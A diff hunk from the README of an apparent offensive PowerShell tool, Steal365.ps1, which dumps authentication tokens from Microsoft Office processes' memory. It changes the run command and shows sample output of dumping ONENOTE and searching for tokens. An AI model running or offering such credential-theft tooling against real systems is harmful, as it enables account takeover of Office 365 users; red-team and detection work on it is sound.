@@ -3,7 +3,7 @@ Dumping tokens from Microsoft Office desktop applications’ memory
 
 ### Run
 ```
-PS C:\Users\IEUser> gc .\Steal365.ps1 | iex
+PS C:\Users\IEUser> .\Steal365.ps1
 [!] WINWORD
 [+] Dump ONENOTE ok
   \-- Looking for tokens...
